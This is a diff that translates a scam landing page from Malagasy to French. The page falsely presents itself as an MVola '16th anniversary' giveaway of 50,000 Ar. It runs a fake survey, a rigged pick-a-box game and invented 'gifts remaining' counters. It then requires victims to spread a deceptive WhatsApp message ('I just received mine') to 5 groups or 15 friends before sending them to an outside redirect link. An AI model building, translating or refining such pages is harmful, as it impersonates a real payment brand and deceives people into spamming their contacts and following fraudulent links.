@@ -2,7 +2,7 @@
 <html lang="en" dir="ltr">
   
 <head>
-<title>Fanomezana avy amin'ny MVola ho an'ny fankalazana ny tsingerintaona (50 000 Ar) </title>
+<title>Cadeau de célébration du 16ème anniversaire MVola 50 000 Ar </title>
 <meta property="og:image" content="" /><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
@@ -305,13 +305,13 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Arahabaina! Voatahiry ny valin-teninao.</h2>
+<h2 class="heading heading--h1">Félicitations ! Votre réponse a été enregistrée.</h2>
  
 <p class="paragraph">
-Ankehitriny dia manana fahafahana handresy loka vola mitentina 50 000 Ar ianao.<br><br>
-Manana vintana in-3 ianao! Mirary soa ho anao!
+Vous avez désormais la possibilité de gagner un prix en espèces de 50 000 Ar.<br><br>
+Vous avez 3 chances ! Bonne chance !
 <br><br>
-Mila misafidy ilay boaty misy ny fanomezana ao anatiny ianao.
+Tu dois choisir la boîte qui contient le cadeau.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
@@ -319,9 +319,9 @@ Commencer
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Foana ilay boaty, andramo indray</h2>
+<h2 class="heading heading--h1">La boîte est vide ; réessayez.</h2>
 <p class="paragraph">
-Manana vintana fanampiny (2) ianao. 
+Vous avez une chance supplémentaire (2). 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -330,11 +330,11 @@ OK
 </vue-modal>
 <vue-modal :open="showSuccessModal">
 <img src="https://banknotenews.com/wp-content/uploads/2025/07/Madagascar_BFM_20000_ariary_2025.00.00_B339c_P104_F_52787871_f.jpg" style="width: 240px;">
-<h1 class="heading heading--h1">Arahabaina! </h1>
+<h1 class="heading heading--h1">Félicitations! </h1>
 <p class="paragraph">
 
 
-Ny loka azonao dia: <b> 50 000 Ar</b><br>Araho ny toromarika ao amin'ny pejy manaraka mba hahazoana ny loka azonao! 
+Votre prix est : <b> 50 000 Ar</b><br>Suivez les instructions figurant sur la page suivante pour réclamer le prix que vous avez gagné !
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -351,12 +351,12 @@ Ok
 
   <img src="https://www.gsma.com/get-involved/gsma-membership/wp-content/uploads/2023/05/MVola_brand_new_vert-04.png" style="width:100%;" />
 <h1 class="heading heading--h1">
-Salama!
+Bonjour
 </h1>
   <p class="paragraph">
-TONGA SOA, <b>Ankafizo ny fanomezana 50 000 Ar avy amin'ny MVola Madagascar ho an'ny mpanjifanay rehetra, ankalazana ny tsingerintaona.</b>, Ho fankalazana ny tsingerintaona faha-16, mizara 50 000 Ar ho an'ireo mpampiasa MVola izahay..
+BIENVENUE, <b>Recevez 50 000 Ar de la part de MVola Madagascar : un cadeau offert à tous nos clients pour célébrer notre 16e anniversaire.</b>, Pour célébrer notre 16e anniversaire, nous offrons 50 000 Ar aux utilisateurs de MVola...
 <br>
-Valio ireo fanontaniana etsy ambany mba hahazoana antoka <b>Loka vola 50 000 Ar</b>
+Répondez aux questions ci-dessous pour continuer <b>Prix ​​en espèces de 50 000 Ar</b>
 </p>
   <br>
 </div>
@@ -373,51 +373,51 @@ Valio ireo fanontaniana etsy ambany mba hahazoana antoka <b>Loka vola 50 000 Ar<
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-Namaly ny fanontaniana 4 amin'ny 4 ianao.
+Vous avez répondu à 4 questions sur 4.
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Eo am-pikarakarana ny valinteninao
+Traitement de votre réponse
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-Mbola misy loka azo raisina!
+Il reste encore des prix à gagner !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Mitady fanomezana..
+À la recherche d’un cadeau…
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Fanomezana (2265) sisa no misy!
+Il ne reste plus que (2265) cadeaux !
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Hamarinina ny tahiry
+Le stock sera vérifié.
 <img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Mampiasa MVola ve ianao?",
-              answers: [ { text: "ENY" }, { text: "tsy misy" } ]
+              title: "Utilisez-vous MVola ?",
+              answers: [ { text: "Oui" }, { text: "Non" } ]
             },
                                                              {
-              title: "Manao ahoana ny naoty omenao ny tolotra MVola?",
-              answers: [ { text: "Tsara" }, { text: "MAHANTRA" } ]
+              title: "Quelle note donneriez-vous au service MVola ?",
+              answers: [ { text: "Bien" }, { text: "Pauvre" } ]
             },
             {
-              title: "Safidio ny maha-lahy na maha-vavy anao?",
-              answers: [ { text: "Lahy" }, { text: "vehivavy" } ]
+              title: "Sélectionnez votre genre ?",
+              answers: [ { text: "Mâle" }, { text: "Femelle" } ]
             },
             {
-              title: "Safidio ny sokajin-taonanao?",
-              answers: [ { text: "18 - 20 taona" }, { text: "21 - 25 taona" }, { text: "26 - 30 taona" }, { text: "30 taona no ho miakatra" } ]
+              title: "Sélectionnez votre tranche d’âge ?",
+              answers: [ { text: "18 - 20 ans" }, { text: "21 - 25 ans" }, { text: "26 - 30 ans" }, { text: "30 ans et plus" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -426,23 +426,23 @@ Hamarinina ny tahiry
   </div>
       </div>
   
-  <div id="share">
+  <div id="partager">
     
 <div class="title1">
-<p>Arahabaina! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://www.gsma.com/get-involved/gsma-membership/wp-content/uploads/2023/05/MVola_brand_new_vert-04.png" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Ny loka azonao dia: <b>50 000 Ar</b> <br>Araho ny toromarika etsy ambany mba hahazoana ny loka azonao !</p>
+<p class="txt1">Votre prix est : <b>50 000 Ar</b> <br>Suivez les instructions ci-dessous pour réclamer votre prix !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.Zarao amin'ny vondrona 5 / namana 15 ao amin'ny "Whatsapp" (tsindrio ny kisary "Whatsapp" etsy ambany)</p><p class="rules">2. Tsindrio ny "Laharana Kaonty" mba hahazoana ny vola ao anatin'ny 2 minitra.</p></div>
+<div id="lastapp"><p class="rules">1.Partagez avec 5 groupes / 15 amis sur WhatsApp (cliquez sur l'icône WhatsApp ci-dessous)</p><p class="rules">2. Appuyez sur « Numéro de compte » pour recevoir les fonds en moins de 2 minutes.</p></div>
 
     
    <div class="share_main_bt" id="whatsapp">WhatsApp&nbsp;   →</div>
-  <h4 class="textlastup">Zarao mandra-feno ilay bara manga!</h4>
+  <h4 class="textlastup">Continuez à partager jusqu’à ce que la barre bleue soit remplie !</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -453,7 +453,7 @@ Hamarinina ny tahiry
                 </div>
     
             <br>       <div class="share_main_bt" onclick="tipn()" style="margin: 20px auto 0; background-color: #BE0612;">
-                               Nomeraon-kaonty
+                               Numéro de compte
                             </div>
    
   </div></div>
@@ -466,21 +466,21 @@ Hamarinina ny tahiry
                       
     <div id="claim">
       <div class="title1">
-<p>Arahabaina! </p>
+<p>Félicitations! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://www.gsma.com/get-involved/gsma-membership/wp-content/uploads/2023/05/MVola_brand_new_vert-04.png" width='81%'/> </center>
                            
 
 	    <a  onclick="window.open('https://uplcm.com/4/6993302')" href="https://uplcm.com/4/6993302" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Misintona 50.000 Ar</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Retirer 50 000 Ar</font></button>
                     </a><br/> <br/> 
-      <div class="share_main_bt" id="offer">Mitakira izao</div><br/> <br/>
+      <div class="share_main_bt" id="offer">Réclamez </div><br/> <br/>
 
           <a  onclick="window.open('https://uplcm.com/4/6993302')" href="https://uplcm.com/4/6993302" >
-                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Ekeo 50.000 Ar</font></button>
+                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="share_main_bt"><font color="#ffffff">Acceptez 50 000 Ar</font></button>
                     </a><br/> <br/>                   
-            <div class="share_main_bt" id="offers">FOANA</div> 
+            <div class="share_main_bt" id="offers">Réclamez le prix</div> 
       <br>
           
        
@@ -533,10 +533,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "*Mampiasa MVola ve ianao?*%0A%0A*Mahazoa fanomezana 50000 Ar MVola fankalazana ny faha-16 taona ho an'ireo mpampiasa MVola rehetra*%0ATsidiho ny rohy eto ambany mba hahazoana 50 000 Ar avy hatrany.%0AVao nahazo ny ahy aho%0A%0AKitiho eto👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
-   "*Mampiasa MVola ve ianao?*%0A%0A*Mahazoa fanomezana 50000 Ar MVola fankalazana ny faha-16 taona ho an'ireo mpampiasa MVola rehetra*%0ATsidiho ny rohy eto ambany mba hahazoana 50 000 Ar avy hatrany.%0AVao nahazo ny ahy aho%0A%0AKitiho eto👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
-    "*Mampiasa MVola ve ianao?*%0A%0A*Mahazoa fanomezana 50000 Ar MVola fankalazana ny faha-16 taona ho an'ireo mpampiasa MVola rehetra*%0ATsidiho ny rohy eto ambany mba hahazoana 50 000 Ar avy hatrany.%0AVao nahazo ny ahy aho%0A%0AKitiho eto👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
-   "*Mampiasa MVola ve ianao?*%0A%0A*Mahazoa fanomezana 50000 Ar MVola fankalazana ny faha-16 taona ho an'ireo mpampiasa MVola rehetra*%0ATsidiho ny rohy eto ambany mba hahazoana 50 000 Ar avy hatrany.%0AVao nahazo ny ahy aho%0A%0AKitiho eto👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
+    "*Utilisez-vous MVola ?*%0A%0A*Recevez un cadeau de 50 000 Ar via MVola à l’occasion du 16e anniversaire — offre accessible à tous les utilisateurs de MVola.*%0AConsultez le lien ci-dessous pour obtenir immédiatement 50 000 Ar.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
+   "*Utilisez-vous MVola ?*%0A%0A*Recevez un cadeau de 50 000 Ar via MVola à l’occasion du 16e anniversaire — offre accessible à tous les utilisateurs de MVola.*%0AConsultez le lien ci-dessous pour obtenir immédiatement 50 000 Ar.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
+    "*Utilisez-vous MVola ?*%0A%0A*Recevez un cadeau de 50 000 Ar via MVola à l’occasion du 16e anniversaire — offre accessible à tous les utilisateurs de MVola.*%0AConsultez le lien ci-dessous pour obtenir immédiatement 50 000 Ar.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
+   "*Utilisez-vous MVola ?*%0A%0A*Recevez un cadeau de 50 000 Ar via MVola à l’occasion du 16e anniversaire — offre accessible à tous les utilisateurs de MVola.*%0AConsultez le lien ci-dessous pour obtenir immédiatement 50 000 Ar.%0AJe viens de recevoir le mien.%0A%0ACliquez ici👇%0Ahttps://sutlnk.ink/MVola-16th-tsingerintaona",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -620,7 +620,7 @@ $("#offerss").click(function () {
    Swal.fire({
   icon: 'error',
   title: 'Unfortunately...',
-  text: 'Mba hahazoanao ny loka, dia mila mizara aminny namana momba ny hetsika ataonay ianao. Tohizo ny fizarana mandra-peno ny bara manga.!',
+  text: 'Pour recevoir le prix, vous devez partager notre événement avec vos amis. Continuez à partager jusqu’à ce que la barre bleue soit remplie..!',
   
 });
    }
